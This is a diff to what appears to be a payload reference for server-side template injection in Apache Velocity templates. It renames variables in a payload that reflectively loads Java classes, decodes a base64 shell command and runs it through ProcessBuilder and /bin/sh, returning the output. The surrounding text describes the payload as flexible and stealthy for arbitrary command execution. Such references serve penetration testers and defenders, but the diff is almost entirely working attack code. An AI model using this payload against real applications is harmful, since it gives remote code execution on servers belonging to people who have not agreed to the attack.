@@ -227,29 +227,33 @@ $str.valueOf($chr.toChars($out.read()))
 
 A more flexible and stealthy payload that supports base64-encoded commands, allowing execution of arbitrary shell commands such as `echo "a" > /tmp/a`. Below is an example with `whoami` in base64:
 ```java
-#set($base64 = 'd2hvYW1p')
-#set($c = $CUSTOMER_CIVILITY.getClass())
-#set($Base64 = $c.forName("java.util.Base64"))
-#set($Decoder = $Base64.getMethod("getDecoder").invoke(null))
-#set($bytes = $Decoder.decode("$base64"))
+#set($base64EncodedCommand = 'd2hvYW1p')
 
-#set($StringCl = $c.forName("java.lang.String"))
-#set($cmd = $StringCl.getConstructor($c.forName("[B"), $c.forName("java.lang.String")).newInstance($bytes, "UTF-8"))
+#set($contextObjectClass = $knownContextObject.getClass())
 
-#set($params = ["/bin/sh", "-c", $cmd])
-#set($pbCl = $c.forName("java.lang.ProcessBuilder"))
-#set($pb = $pbCl.getConstructor($c.forName("java.util.List")).newInstance($params))
-#set($pb = $pb.redirectErrorStream(true))
-#set($p = $pb.start())
-#set($exit = $p.waitFor())
+#set($Base64Class = $contextObjectClass.forName("java.util.Base64"))
+#set($Base64Decoder = $Base64Class.getMethod("getDecoder").invoke(null))
+#set($decodedBytes = $Base64Decoder.decode($base64EncodedCommand))
 
-#set($is = $p.getInputStream())
-#set($sc = $c.forName("java.util.Scanner"))
-#set($s = $sc.getConstructor($c.forName("java.io.InputStream")).newInstance($is))
-#set($sDelimiter = $s.useDelimiter("\\A"))
-#if($s.hasNext())
-#set($out = $s.next().trim())
-$out.replaceAll("\\s+$", "").replaceAll("^\\s+", "")
+#set($StringClass = $contextObjectClass.forName("java.lang.String"))
+#set($command = $StringClass.getConstructor($contextObjectClass.forName("[B"), $contextObjectClass.forName("java.lang.String")).newInstance($decodedBytes, "UTF-8"))
+
+#set($commandArgs = ["/bin/sh", "-c", $command])
+
+#set($ProcessBuilderClass = $contextObjectClass.forName("java.lang.ProcessBuilder"))
+#set($processBuilder = $ProcessBuilderClass.getConstructor($contextObjectClass.forName("java.util.List")).newInstance($commandArgs))
+#set($processBuilder = $processBuilder.redirectErrorStream(true))
+#set($process = $processBuilder.start())
+#set($exitCode = $process.waitFor())
+
+#set($inputStream = $process.getInputStream())
+#set($ScannerClass = $contextObjectClass.forName("java.util.Scanner"))
+#set($scanner = $ScannerClass.getConstructor($contextObjectClass.forName("java.io.InputStream")).newInstance($inputStream))
+#set($scannerDelimiter = $scanner.useDelimiter("\\A"))
+
+#if($scanner.hasNext())
+  #set($output = $scanner.next().trim())
+  $output.replaceAll("\\s+$", "").replaceAll("^\\s+", "")
 #end
 ```
 ---
